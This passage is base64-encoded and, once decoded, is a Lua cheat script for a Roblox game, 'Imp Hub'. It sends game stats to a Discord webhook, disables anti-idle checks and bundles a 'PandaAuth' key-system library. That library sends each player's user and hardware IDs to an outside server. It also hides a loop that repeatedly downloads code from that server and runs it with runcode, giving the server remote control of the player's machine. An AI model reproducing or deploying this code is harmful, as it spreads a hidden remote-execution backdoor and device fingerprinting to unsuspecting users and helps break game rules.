lcjogIiwgdmFsdWUgPSB0aW1lLCBpbmxpbmUgPSB0cnVlfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7bmFtZSA9ICJb8J+Or10gV2F2ZXMgQ2xlYXJlZDogIiwgdmFsdWUgPSB3YXZlcywgaW5saW5lID0gdHJ1ZX0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAge25hbWUgPSAiW+KZu++4j10gRGlmZmljdWx0eTogIiwgdmFsdWUgPSBkaWZmLCBpbmxpbmUgPSB0cnVlfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7bmFtZSA9ICJb8J+TpV0gQ2hhcHRlcjogIiwgdmFsdWUgPSBjaGFwdGVyLCBpbmxpbmUgPSB0cnVlfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7bmFtZSA9ICJb8J+TjV0gS2lsbHM6ICIsIHZhbHVlID0ga2lsbHMsIGlubGluZSA9IHRydWV9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtuYW1lID0gIlvwn5ehXSBEYW1hZ2UgRGVhbGVkOiAiLCB2YWx1ZSA9IGRtZywgaW5saW5lID0gdHJ1ZX0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAge25hbWUgPSAiW/Cfl4NdIFBsYWNlZCBVbml0czogIiwgdmFsdWUgPSB1bml0c3BsYWNlZCwgaW5saW5lID0gdHJ1ZX0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlvwn5OIXSBQbGF5ZXIgTGV2ZWw6ICIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gc3RyaW5nLm1hdGNoKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLkhVRC5Cb3R0b20uTGV2ZWxpbmcuUHJvZ3Jlc3Npb24uVGV4dCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJMZXZlbCAlZCsiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlubGluZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgWyJmb290ZXIiXSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZXh0ID0gIllvdSBIYXMgSnVzdCBGaW5pc2hlZCBBIEdhbWUgQXQ6ICIgLi4gb3MuZGF0ZSgiJWMiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGxvY2FsIFJlcXVlc3QgPSBodHRwX3JlcXVlc3Qgb3IgcmVxdWVzdCBvciBIdHRwUG9zdAogICAgICAgICAgICAgICAgUmVxdWVzdCh7VXJsID0gdXJsLCBCb2R5ID0gSHR0cDpKU09ORW5jb2RlKERhdGEpLCBNZXRob2QgPSAiUE9TVCIsIEhlYWRlcnMgPSBIZWFkZXJzfSkKICAgICAgICAgICAgICAgIEZsdWVudDpOb3RpZnkoCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBUaXRsZSA9ICJJbXAgSHViIiwKICAgICAgICAgICAgICAgICAgICAgICAgQ29udGVudCA9ICJTdWNjZXNzZnVsbHkgU2VuZGVkIFdlYmhvb2sgVG86IiwKICAgICAgICAgICAgICAgICAgICAgICAgU3ViQ29udGVudCA9IHVybCwKICAgICAgICAgICAgICAgICAgICAgICAgRHVyYXRpb24gPSAxNQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUm91bmRTdW1tYXJ5Lk1haW4uQ29udGVudC5SZXR1cm4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdCgKICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBDb21wbGV0ZWRBY3Rpb25zID0ge30KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICApCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5Sb3VuZFN1bW1hcnkuTWFpbi5Db250ZW50LkFjdGlvbnMuTmV4dC5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KAogICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIENvbXBsZXRlZEFjdGlvbnMgPSB7fQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICkKCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5Sb3VuZFN1bW1hcnkuTWFpbi5Db250ZW50LkFjdGlvbnMuUmVwbGF5Lk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoCiAgICAgICAgICAgICAgICBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgQ29tcGxldGVkQWN0aW9ucyA9IHt9CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgKQogICAgICAgIGVuZAogICAgKQplbmQKCmZvciBpLCB2IGluIHBhaXJzKGdldGNvbm5lY3Rpb25zKFBsci5JZGxlZCkpIGRvCiAgICB2OkRpc2FibGUoKQplbmQKCmVuZAoKbG9jYWwgaXNMb2dnaW5nSW4gPSBmYWxzZQoKbG9jYWwgUGFuZGFBdXRoID0ge30KCmxvY2FsIHVwdGltZUNoZWNrID0gInNjMXBuemh0ajljaDU0bG1hYmRmZ2xtd3Zsdzd4bWJpc2Ztcnlrbm56OCIKbG9jYWwgY29udGVudCA9ICJjMm14Y2c1YXNmcnFvdW5vbnRyc3R1ZmlyZ3podGUxeHZreDNuM2hueWtsenptMXN3dXRvdGl0YW9kMCIKbG9jYWwgYWdlbnQgPSAicGFuZGFhdXRoIgoKbG9jYWwgVmFsaWRhdGlvbl9EZWxheSA9IDMKZ2V0Z2VudigpLnNldGNsaXBib2FyZCA9IHNldGNsaXBib2FyZCBvciB0b2NsaXBib2FyZCBvciBzZXRfY2xpcGJvYXJkIG9yIChDbGlwYm9hcmQgYW5kIENsaXBib2FyZC5zZXQpCmdldGdlbnYoKS5BbGxvd0xpYk5vdGlmaWNhdGlvbiA9IHRydWUKZ2V0Z2VudigpLkN1c3RvbUxvZ28gPSAiMTQzMTcxMzA3MTAiCgpsb2NhbCBUZW1wb3JhcnlBY2Nlc3MgPSBmYWxzZQoKZ2V0Z2VudigpLkF1dG9tYXRpY0ZhaWxzYWZlID0gZmFsc2UKCmdldGdlbnYoKS5TZWN1cmVNb2RlID0gZmFsc2UKCmdldGdlbnYoKS5QYW5kYV9Qcm9jZXNzaW5nU3RhdCA9IGZhbHNlCgpsb2NhbCBodHRwX3NlcnZpY2UgPSBjbG9uZXJlZihnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikpCmxvY2FsIHJieF9hbmFseXRpY3Nfc2VydmljZSA9IGNsb25lcmVmKGdhbWU6R2V0U2VydmljZSgiUmJ4QW5hbHl0aWNzU2VydmljZSIpKQpsb2NhbCBzdGFydGVyX2d1aV9zZXJ2aWNlID0gY2xvbmVyZWYoZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIikpCmxvY2FsIHBsYXllcnNfc2VydmljZSA9IGNsb25lcmVmKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpKQpsb2NhbCBfdG9zdHJpbmcgPSBjbG9uZWZ1bmN0aW9uKHRvc3RyaW5nKQoKbG9jYWwgc2VydmVyX2NvbmZpZ3VyYXRpb24gPSAiaHR0cHM6Ly9wYW5kYWRldmVsb3BtZW50Lm5ldCIKCmxvY2FsIExpYlZlcnNpb24gPSAidjIuNS45MCAoMDUtMzAtMjAyNCkiCgpsb2NhbCB2YWxpZGF0aW9uX3NlcnZpY2UgPSBzZXJ2ZXJfY29uZmlndXJhdGlvbiAuLiAiL3YyX3ZhbGlkYXRpb24iCgpsb2NhbCBmdW5jdGlvbiBQYW5kYVZhbmd1YXJkX1J1bigpCiAgICAtLSBlbXB0eQplbmQKCmxvY2FsIGZ1bmN0aW9uIEdldF9SZXF1ZXN0RGF0YShkYXRhX2xpbmspCiAgICBpZiBnZXRnZW52KCkuUGFuZGFfUHJvY2Vzc2luZ1N0YXQgdGhlbgogICAgICAgIHdhcm4oIllvdXIgQ29tbWFuZCBoYXMgYmVlbiBUaHJvdHRsZSwgUGxlYXNlIFdhaXQuLi4uIikKICAgICAgICByZXR1cm4gIk5vX0RhdGEiCiAgICBlbmQKCiAgICBnZXRnZW52KCkuUGFuZGFfUHJvY2Vzc2luZ1N0YXQgPSB0cnVlCiAgICBsb2NhbCBEYXRhUmVzcG9uc2UgPQogICAgICAgIHJlcXVlc3QoCiAgICAgICAgewogICAgICAgICAgICBVcmwgPSBkYXRhX2xpbmssCiAgICAgICAgICAgIE1ldGhvZCA9ICJHRVQiLAogICAgICAgICAgICBIZWFkZXJzID0gewogICAgICAgICAgICAgICAgWyJ4LXVwdGltZS1jaGVjayJdID0gdXB0aW1lQ2hlY2ssCiAgICAgICAgICAgICAgICBbIngtY29udGVudC10eXBlIl0gPSBjb250ZW50LAogICAgICAgICAgICAgICAgWyJ1c2VyLWFnZW50Il0gPSBhZ2VudAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgKQoKICAgIGdldGdlbnYoKS5QYW5kYV9Qcm9jZXNzaW5nU3RhdCA9IGZhbHNlCgogICAgaWYgRGF0YVJlc3BvbnNlLlN0YXR1c0NvZGUgPT0gMjAwIHRoZW4KICAgICAgICByZXR1cm4gRGF0YVJlc3BvbnNlLkJvZHkKICAgIGVsc2UKICAgICAgICBpZiBEYXRhUmVzcG9uc2UuU3RhdHVzQ29kZSA9PSA0MjkgdGhlbgogICAgICAgICAgICAtLSBUb28gbWFueSByZXF1ZXN0cwogICAgICAgIGVsc2VpZiBEYXRhUmVzcG9uc2UuU3RhdHVzQ29kZSA9PSA1MDAgdGhlbgogICAgICAgICAgICAtLSBJbnRlcm5hbCBFcnJvcgogICAgICAgIGVsc2VpZiBEYXRhUmVzcG9uc2UuU3RhdHVzQ29kZSA9PSA0MDMgdGhlbgogICAgICAgICAgICAtLSBVbmFibGUgdG8gQWNjZXNzIHRoZSBTZXJ2ZXIKICAgICAgICBlbHNlCiAgICAgICAgICAgIC0tIFVua25vd24gRXJyb3Igb24gU2VydmVyCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuICJOb19EYXRhIgogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gR2V0SGFyZHdhcmVJRChzZXJ2aWNlKQogICAgUGFuZGFWYW5ndWFyZF9SdW4oKQoKICAgIGxvY2FsIGNsaWVudF9pZCA9IHJieF9hbmFseXRpY3Nfc2VydmljZTpHZXRDbGllbnRJZCgpCiAgICBsb2NhbCBzdWNjZXNzLCBqc29uRGF0YSA9CiAgICAgICAgcGNhbGwoCiAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICByZXR1cm4gaHR0cF9zZXJ2aWNlOkpTT05EZWNvZGUoCiAgICAgICAgICAgICAgICBHZXRfUmVxdWVzdERhdGEoc2VydmVyX2NvbmZpZ3VyYXRpb24gLi4gIi9zZXJ2aWNlYXBpP3NlcnZpY2U9IiAuLiBzZXJ2aWNlIC4uICImY29tbWFuZD1nZXRjb25maWciKQogICAgICAgICAgICApCiAgICAgICAgZW5kCiAgICApCiAgICBpZiBzdWNjZXNzIHRoZW4KICAgICAgICBpZiBqc29uRGF0YS5BdXRoTW9kZSA9PSAicGxheWVyaWQiIHRoZW4KICAgICAgICAgICAgcmV0dXJuIF90b3N0cmluZyhwbGF5ZXJzX3NlcnZpY2UuTG9jYWxQbGF5ZXIuVXNlcklkKQogICAgICAgIGVsc2VpZiBqc29uRGF0YS5BdXRoTW9kZSA9PSAiaHdpZHBsYXllciIgdGhlbgogICAgICAgICAgICByZXR1cm4gY2xpZW50X2lkIC4uIHBsYXllcnNfc2VydmljZS5Mb2NhbFBsYXllci5Vc2VySWQKICAgICAgICBlbHNlaWYganNvbkRhdGEuQXV0aE1vZGUgPT0gImh3aWRvbmx5IiB0aGVuCiAgICAgICAgICAgIHJldHVybiBjbGllbnRfaWQKICAgICAgICBlbHNlaWYganNvbkRhdGEuQXV0aE1vZGUgPT0gImZpbmdlcnByaW50IiB0aGVuCiAgICAgICAgICAgIGxvY2FsIEdldEZpbmdlcnByaW50ID0gR2V0X1JlcXVlc3REYXRhKHNlcnZlcl9jb25maWd1cmF0aW9uIC4uICIvZmluZ2VycHJpbnQiKQogICAgICAgICAgICByZXR1cm4gdG9zdHJpbmcoR2V0RmluZ2VycHJpbnQpCiAgICAgICAgZWxzZQogICAgICAgICAgICByZXR1cm4gcGxheWVyc19zZXJ2aWNlLkxvY2FsUGxheWVyLlVzZXJJZAogICAgICAgIGVuZAogICAgZWxzZQogICAgICAgIHJldHVybiBjbGllbnRfaWQKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIEF1dG9tYXRpY0hUVFBFeGVjKGlkZW50aWZpZXIpCiAgICBpZiBBdXRvbWF0aWNIVFRQRXhlYyA9PSAidmVnYXgiIG9yIEF1dG9tYXRpY0hUVFBFeGVjID09ICJldm9uIiB0aGVuCiAgICAgICAgbG9jYWwgTm9fRXhlY3V0ZSA9ICJTY3JpcHRfTm90X0ZvdW5kIgogICAgICAgIGxvY2FsIFVVSUQgPSBHZXRIYXJkd2FyZUlEKGlkZW50aWZpZXIpCiAgICAgICAgdGFzay5zcGF3bigKICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29udGVudCA9IGdhbWU6SHR0cEdldCgiaHR0cHM6Ly91dGlsaXR5LnBhbmRhZGV2ZWxvcG1lbnQubmV0L3JlYWRjb250ZW50P3BsYXllcmlkPSIgLi4gVVVJRCkKICAgICAgICAgICAgICAgICAgICBpZiBjb250ZW50IH49IE5vX0V4ZWN1dGUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCByZXN1bHQgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcnVuY29kZShjb250ZW50KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6SHR0cEdldCgiaHR0cHM6Ly91dGlsaXR5LnBhbmRhZGV2ZWxvcG1lbnQubmV0L2NsZWFyP3BsYXllcmlkPSIgLi4gVVVJRCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhcm4oIkVycm9yIGV4ZWN1dGluZyBsb2FkZWQgY29kZToiLCByZXN1bHQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkh0dHBHZXQoImh0dHBzOi8vdXRpbGl0eS5wYW5kYWRldmVsb3BtZW50Lm5ldC9jbGVhcj9wbGF5ZXJpZD0iIC4uIFVVSUQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICkKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIFBhbmRhTGliTm90aWZpY2F0aW9uKG1lc3NhZ2UpCiAgICBpZiBBbGxvd0xpYk5vdGlmaWNhdGlvbiB0aGVuCiAgICAgICAgc3RhcnRlcl9ndWlfc2VydmljZTpTZXRDb3JlKAogICAgICAgICAgICAiU2VuZE5vdGlmaWNhdGlvbiIsCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIktleSBTeXN0ZW0iLAogICAgICAgICAgICAgICAgVGV4dCA9IG1lc3NhZ2UsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDYsCiAgICAgICAgICAgICAgICBJY29uID0gInJieGFzc2V0aWQ6Ly8iIC4uIEN1c3RvbUxvZ28KICAgICAgICAgICAgfQogICAgICAgICkKICAgIGVuZAplbmQKCmZ1bmN0aW9uIFBhbmRhQXV0aDpWZXJzaW9uKCkKICAgIHJldHVybiBMaWJWZXJzaW9uCmVuZAoKZnVuY3Rpb24gUGFuZGFBdXRoOkdldEtleShFeHBsb2l0KQogICAgaWYgVGVtcG9yYXJ5QWNjZXNzIHRoZW4KICAgICAgICBsb2NhbCBUZW1wS2V5ID0KICAgICAgICAgICAgc2VydmVyX2NvbmZpZ3VyYXRpb24gLi4gIi9nZXRrZXk/c2VydmljZT0iIC4uIEV4cGxvaXQgLi4gIiZod2lkPSIgLi4gcGxheWVyc19zZXJ2aWNlLkxvY2FsUGxheWVyLlVzZXJJZAogICAgICAgIHJldHVybiBUZW1wS2V5CiAgICBlbmQKICAgIGlmIEV4cGxvaXQgPT0gInZlZ2F4IiB0aGVuCiAgICAgICAgbG9jYWwgVmVnYUV4Y2x1c2l2ZSA9CiAgICAgICAgICAgIHNlcnZlcl9jb25maWd1cmF0aW9uIC4uICIvZ2V0a2V5P3NlcnZpY2U9dmVnYXgmaHdpZD0iIC4uIEdldEhhcmR3YXJlSUQoRXhwbG9pdCkgLi4gIiZwcm92aWRlcj1saW5rdmVydGlzZSIKICAgICAgICByZXR1cm4gVmVnYUV4Y2x1c2l2ZQogICAgZW5kCiAgICBsb2NhbCB1c2VyX2xpbmsgPSBzZXJ2ZXJfY29uZmlndXJhdGlvbiAuLiAiL2dldGtleT9zZXJ2aWNlPSIgLi4gRXhwbG9pdCAuLiAiJmh3aWQ9IiAuLiBHZXRIYXJkd2FyZUlEKEV4cGxvaXQpCiAgICBQYW5kYUxpYk5vdGlmaWNhdGlvbih1c2VyX2xpbmspCiAgICByZXR1cm4gdXNlcl9saW5rCmVuZAoKZnVuY3Rpb24gUGFuZGFBdXRoOkdldExpbmsoRXhwbG9pdCkKICAgIGlmIFRlbXBvcmFyeUFjY2VzcyB0aGVuCiAgICAgICAgbG9jYWwgVGVtcEtleSA9CiAgICAgICAgICAgIHNlcnZlcl9jb25maWd1cmF0aW9uIC4uICIvZ2V0a2V5P3NlcnZpY2U9IiAuLiBFeHBsb2l0IC4uICImaHdpZD0iIC4uIHBsYXllcnNfc2VydmljZS5Mb2NhbFBsYXllci5Vc2VySWQKICAgICAgICByZXR1cm4gVGVtcEtleQogICAgZW5kCiAgICBpZiBFeHBsb2l0ID09ICJ2ZWdheCIgdGhlbgogICAgICAgIGxvY2FsIFZlZ2FFeGNsdXNpdmUgPQogICAgICAgICAgICBzZXJ2ZXJfY29uZmlndXJhdGlvbiAuLiAiL2dldGtleT9zZXJ2aWNlPXZlZ2F4Jmh3aWQ9IiAuLiBHZXRIYXJkd2FyZUlEKEV4cGxvaXQpIC4uICImcHJvdmlkZXI9bGlua3ZlcnRpc2UiCiAgICAgICAgcmV0dXJuIFZlZ2FFeGNsdXNpdmUKICAgIGVuZAogICAgbG9jYWwgdXNlcl9saW5rID0gc2VydmVyX2NvbmZpZ3VyYXRpb24gLi4gIi9nZXRrZXk/c2VydmljZT0iIC4uIEV4cGxvaXQgLi4gIiZod2lkPSIgLi4gR2V0SGFyZHdhcmVJRChFeHBsb2l0KQogICAgUGFuZGFMaWJOb3RpZmljYXRpb24odXNlcl9saW5rKQogICAgcmV0dXJuIHVzZXJfbGluawplbmQKCmZ1bmN0aW9uIFBhbmRhQXV0aDpWYWxpZGF0ZUtleShzZXJ2aWNlSUQsIENsaWVudEtleSkKICAgIGlmIENsaWVudEtleSA9PSAiIiB0aGVuCiAgICAgICAgcmV0dXJuIGZhbHNlCiAgICBlbmQKICAgIGlmIFRlbXBvcmFyeUFjY2VzcyB0aGVuCiAgICAgICAgcmV0dXJuIHRydWUKICAgIGVuZAogICAgUGFuZGFWYW5ndWFyZF9SdW4oKQogICAgd2FpdChWYWxpZGF0aW9uX0RlbGF5KQogICAgbG9jYWwgRGF0YSA9CiAgICAgICAgR2V0X1JlcXVlc3REYXRhKAogICAgICAgIHZhbGlkYXRpb25fc2VydmljZSAuLiAiP2h3aWQ9IiAuLiBHZXRIYXJkd2FyZUlEKHNlcnZpY2VJRCkgLi4gIiZzZXJ2aWNlPSIgLi4gc2VydmljZUlEIC4uICIma2V5PSIgLi4gQ2xpZW50S2V5CiAgICApCiAgICBpZiBEYXRhID09ICJOb19EYXRhIiB0aGVuCiAgICAgICAgaWYgZ2V0Z2VudigpLkF1dG9tYXRpY0ZhaWxzYWZlIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gZmFsc2UKICAgIGVuZAogICAgbG9jYWwgc3VjY2VzcywgZGF0YSA9CiAgICAgICAgcGNhbGwoCiAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICByZXR1cm4gaHR0cF9zZXJ2aWNlOkpTT05EZWNvZGUoRGF0YSkKICAgICAgICBlbmQKICAgICkKICAgIGlmIHN1Y2Nlc3MgYW5kIGRhdGFbIlYyX0F1dGhlbnRpY2F0aW9uIl0gPT0gInN1Y2Nlc3MiIHRoZW4KCQlBdXRvbWF0aWNIVFRQRXhlYyhzZXJ2aWNlSUQpCiAgICAgICAgcmV0dXJuIHRydWUKICAgIGVuZAogICAgcmV0dXJuIGZhbHNlCmVuZAoKZnVuY3Rpb24gUGFuZGFBdXRoOlZhbGlkYXRlUHJlbWl1bUtleShzZXJ2aWNlSUQsIENsaWVudEtleSkKICAgIGlmIENsaWVudEtleSA9PSAiIiB0aGVuCiAgICAgICAgcmV0dXJuIGZhbHNlCiAgICBlbmQKICAgIGlmIFRlbXBvcmFyeUFjY2VzcyB0aGVuCiAgICAgICAgcmV0dXJuIHRydWUKICAgIGVuZAogICAgUGFuZGFWYW5ndWFyZF9SdW4oKQogICAgd2FpdChWYWxpZGF0aW9uX0RlbGF5KQogICAgbG9jYWwgRGF0YSA9CiAgICAgICAgR2V0X1JlcXVlc3REYXRhKAogICAgICAgIHZhbGlkYXRpb25fc2VydmljZSAuLiAiP2h3aWQ9IiAuLiBHZXRIYXJkd2FyZUlEKHNlcnZpY2VJRCkgLi4gIiZzZXJ2aWNlPSIgLi4gc2VydmljZUlEIC4uICIma2V5PSIgLi4gQ2xpZW50S2V5CiAgICApCiAgICBpZiBEYXRhID09ICJOb19EYXRhIiB0aGVuCiAgICAgICAgaWYgZ2V0Z2VudigpLkF1dG9tYXRpY0ZhaWxzYWZlIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gZmFsc2UKICAgIGVuZAogICAgbG9jYWwgc3VjY2VzcywgZGF0YSA9CiAgICAgICAgcGNhbGwoCiAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICByZXR1cm4gaHR0cF9zZXJ2aWNlOkpTT05EZWNvZGUoRGF0YSkKICAgICAgICBlbmQKICAgICkKICAgIGlmIHN1Y2Nlc3MgYW5kIGRhdGFbIlYyX0F1dGhlbnRpY2F0aW9uIl0gPT0gInN1Y2Nlc3MiIGFuZCBkYXRhWyJLZXlfSW5mb3JtYXRpb24iXVsiUHJlbWl1bV9Nb2RlIl0gPT0gdHJ1ZSB0aGVuCgkgICAgQXV0b21hdGljSFRUUEV4ZWMoc2VydmljZUlEKQogICAgICAgIHJldHVybiB0cnVlCiAgICBlbmQKICAgIHJldHVybiBmYWxzZQplbmQKCmZ1bmN0aW9uIFBhbmRhQXV0aDpWYWxpZGF0ZU5vcm1hbEtleShzZXJ2aWNlX25hbWUsIEtleSkKICAgIHJldHVybiBQYW5kYUF1dGg6VmFsaWRhdGVLZXkoc2VydmljZV9uYW1lLCBLZXkpCmVuZAoKZnVuY3Rpb24gUGFuZGFBdXRoOkF1dGhlbnRpY2F0ZV9LZXlsZXNzKHNlcnZpY2VfbmFtZSkKICAgIHJldHVybiBQYW5kYUF1dGg6VmFsaWRhdGVLZXkoc2VydmljZV9uYW1lLCAia2V5bGVzcyIpCmVuZAoKZnVuY3Rpb24gUGFuZGFBdXRoOkF1dGhvcml6ZWRLeVJCTFgoc2VydmljZUlELCBDbGllbnRLZXksIGlzUHJlbWl1bSkKICAgIGlmIFRlbXBvcmFyeUFjY2VzcyB0aGVuCiAgICAgICAgcmV0dXJuIHRydWUKICAgIGVuZAogICAgaWYgaXNQcmVtaXVtIHRoZW4KICAgICAgICByZXR1cm4gUGFuZGFBdXRoOlZhbGlkYXRlUHJlbWl1bUtleShzZXJ2aWNlSUQsIENsaWVudEtleSkKICAgIGVsc2UKICAgICAgICByZXR1cm4gUGFuZGFBdXRoOlZhbGlkYXRlS2V5KHNlcnZpY2VJRCwgQ2xpZW50S2V5KQogICAgZW5kCmVuZAoKZnVuY3Rpb24gUGFuZGFBdXRoOlJlc2V0SGFyZHdhcmVJRChTZXJ2aWNlSUQsIG9sZEtleSkKICAgIFBhbmRhVmFuZ3VhcmRfUnVuKCkKICAgIGxvY2FsIHNlcnZpY2VfbmFtZSA9IHN0cmluZy5sb3dlcihTZXJ2aWNlSUQpCgogICAgbG9jYWwgd2hhdHRoZSA9CiAgICAgICAgcmVxdWVzdCgKICAgICAgICB7CiAgICAgICAgICAgIFVybCA9IHNlcnZlcl9jb25maWd1cmF0aW9uIC4uCiAgICAgICAgICAgICAgICAiL3NlcnZpY2VhcGkvZWRpdC9od2lkLz9zZXJ2aWNlPSIgLi4KICAgICAgICAgICAgICAgICAgICBzZXJ2aWNlX25hbWUgLi4KICAgICAgICAgICAgICAgICAgICAgICAgIiZrZXk9IiAuLiBvbGRLZXkgLi4gIiZuZXdod2lkPSIgLi4gZ2FtZTpHZXRTZXJ2aWNlKCJSYnhBbmFseXRpY3NTZXJ2aWNlIik6R2V0Q2xpZW50SWQoKSwKICAgICAgICAgICAgTWV0aG9kID0gIlBPU1QiLAogICAgICAgICAgICBIZWFkZXJzID0gewogICAgICAgICAgICAgICAgWyJ4LXVwdGltZS1jaGVjayJdID0gdXB0aW1lQ2hlY2ssCiAgICAgICAgICAgICAgICBbIngtY29udGVudC10eXBlIl0gPSBjb250ZW50LAogICAgICAgICAgICAgICAgWyJ1c2VyLWFnZW50Il0gPSBhZ2VudAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgKS5Cb2R5CmVuZAoKZnVuY3Rpb24gUGFuZGFBdXRoOlNldEhUVFBQcm90b2NvbChJUHY0KQogICAgcHJpbnQoIlRoaXMgRmVhdHVyZSBoYXMgYmVlbiBSZW1vdmVkIikKZW5kCgpsb2NhbCBTZXJ2aWNlSUQgPSAiaW1waHViIgoKUHJvZ3Jlc3MuTG9naW46U2V0S2V5TGluayhQYW5kYUF1dGg6R2V0S2V5KFNlcnZpY2VJRCkpCgpsb2NhbCB3aW5kb3cgPSBQcm9ncmVzcy5XaW5kb3cKbG9jYWwgZnVuY3Rpb24gQ2hlY2tLZXkoa2V5KQoJaXNMb2dnaW5nSW4gPSB0cnVlCgl0YXNrLnNwYXduKHdpbmRvdy5TZXRMb2FkaW5nU3RhdGUsIHdpbmRvdywgaXNMb2dnaW5nSW4pCglsb2NhbCByZXN1bHQgPSBQYW5kYUF1dGg6VmFsaWRhdGVLZXkoU2VydmljZUlELCBrZXkpCglpc0xvZ2dpbmdJbiA9IGZhbHNlCgl0YXNrLnNwYXduKHdpbmRvdy5TZXRMb2FkaW5nU3RhdGUsIHdpbmRvdywgaXNMb2dnaW5nSW4pCglyZXR1cm4gcmVzdWx0CmVuZAoKUHJvZ3Jlc3MuTG9naW4uT25Mb2dpbiA9IGZ1bmN0aW9uKGtleSkKCWlmIG5vdCBpc0xvZ2dpbmdJbiB0aGVuCgkJbG9jYWwga2V5UmVzdWx0ID0gQ2hlY2tLZXkoa2V5KQoJCWlmIGtleVJlc3VsdCB0aGVuCgkJCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCQkJUHJvZ3Jlc3M6U2hvd1RvYXN0KHsKCQkJCQlUZXh0ID0gIlZhbGlkIEtleSEiLAoJCQkJCUR1cmF0aW9uID0gMi41CgkJCQl9KQoJCQkJVGhlU2NyaXB0KCkKCQkJZW5kKQoJCQlpZiB3cml0ZWZpbGUgdGhlbgoJCQkJd3JpdGVmaWxlKCJJbXBLZXkudHh0Iiwga2V5KQoJCQkJUHJvZ3Jlc3M6U2hvd1RvYXN0KHsKCQkJCQlUZXh0ID0gIlNhdmVkIEtleSBTdWNjZXNzZnVsbHkhIiwKCQkJCQlEdXJhdGlvbiA9IDQuNQoJCQkJfSkKCQkJZW5kCgkJZWxzZQoJCQl0YXNrLnNwYXduKHdpbmRvdy5TaG93RGlhbG9nLCB3aW5kb3csIHsKCQkJCVRpdGxlID0gIkVycm9yIENoZWNraW5nIEtleSIsCgkJCQlUZXh0ID0gIllvdXIga2V5